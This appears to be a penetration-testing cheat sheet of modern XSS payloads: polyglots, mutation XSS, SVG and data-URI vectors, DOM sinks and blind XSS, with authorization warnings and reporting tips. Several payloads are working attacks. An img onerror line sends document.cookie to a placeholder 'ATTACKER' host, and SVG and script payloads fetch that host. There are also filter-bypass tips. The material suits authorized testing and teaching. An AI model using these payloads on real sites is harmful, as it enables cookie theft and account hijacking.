# Modern XSS polyglot & safe PoC

> This document gathers modern XSS payloads and techniques (mXSS, SVG, data URIs, DOM sinks) and provides safe, non-destructive proof-of-concept examples and testing guidance.

---

## Warning — security

This content is for educational and testing purposes only. Run these payloads only against targets you own or are explicitly authorized to test, such as a demo target, a lab environment, or a self-hosted application.

When creating proof-of-concept payloads, prefer non-destructive actions such as `console.log`, `fetch()` to a controlled endpoint, or writing to a local log file rather than using `alert()` or destructive behavior.

---

## Short polyglots and payloads (prefer `console.log` for PoC)

- Console PoC (safer than `alert`):

```html
<script>console.log(document.domain, window.origin)</script>
```

- Image `onerror` payload to send cookies to a controlled endpoint:

```html
<img src=x onerror="new Image().src='//ATTACKER/?c='+encodeURIComponent(document.cookie)">
```

- Short SVG payload that triggers a fetch to an attacker-controlled endpoint:

```html
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('//ATTACKER/?d='+encodeURIComponent(document.domain))"/>
```

- Data URI example:

```text
data:text/html,<script>console.log(document.domain)</script>
```

- Minimal polyglot payload that works in many contexts:

```html
"><svg/onload=console.log(document.domain)>
```

---

## Mutation XSS (mXSS)

- Context: some transformations performed by client-side code or rendering engines can mutate the input and re-activate JavaScript that appeared harmless at first.

- Safe PoC: use `console.log` to confirm execution without triggering intrusive popups:

```html
<noscript><p title="</noscript><img src=x onerror=console.log('mXSS:'+document.domain)>
```

Short explanation: if a filter or sanitizer allows partially escaped sequences, mutation can close tags or rebuild an executable `onerror`/`onload` attribute.

---

## DOM-based XSS — sinks and safe PoC examples

- `innerHTML` sink:

```js
// Dangerous sink example
element.innerHTML = '<img src=x onerror=console.log("PoC:"+document.domain)>';
```

- `document.write` sink:

```js
document.write('<script>console.log("PoC:"+document.domain)<\/script>');
```

- Unsafe `postMessage` usage:

```js
parent.postMessage({url:"javascript:console.log(document.domain)"}, '*');
```

Note: these examples use `console.log` instead of `alert()` to reduce noise during testing.

---

## CSP and modern defenses

- A well-configured CSP (`script-src 'nonce-...'` or `strict-dynamic`) blocks most inline script execution. However, vectors such as `data:` or `blob:` may bypass poorly configured policies.

- Things to check:
  - whether `unsafe-inline` is present
  - whether `data:` or `blob:` is allowed
  - whether nonces are correctly generated and validated on the server side

---

## SVG and XML specifics

- SVG can include event handlers like `onload`, `onerror`, and inline `<script>` tags; browser behavior may differ between Chromium, Firefox, and WebKit.
- For testing, prefer `console.log` in `onload` or `onerror` rather than `alert()`.

---

## Blind XSS — good practices

For blind XSS, prefer `fetch()` to a controlled endpoint rather than a browser popup or destructive action:

```html
<script>fetch('https://ATTACKER/notify?d='+encodeURIComponent(document.domain))</script>
```

This makes it possible to receive a simple notification without requiring user interaction.

---

## Basic filter bypass tips

- Encoded payloads using hex, unicode, or comments/newlines may bypass naive filters based on signatures.
- Mutation-based payloads can trigger execution after DOM changes.
- Test across multiple browsers and rendering engines.

---

## Recommended tools

- XSStrike
- Dalfox
- XSSer
- domdig

Use automated scanners as a starting point, but always verify and validate the PoC manually.

---

## PoC etiquette

When writing a report or documenting a finding, include:

- the exact URL and vulnerable parameter
- the payload used
- the proof of execution (for example, console output or a request to a controlled endpoint)
- the impact and a mitigation recommendation

---

## References

- PortSwigger XSS cheat sheet
- Mutation XSS / mXSS resources and write-ups
- LiveOverflow and other vendor/security research sources cited in the main XSS section

---

*This addition complements the existing XSS section with modern payloads, safe proof-of-concept guidance, and responsible testing practices.*
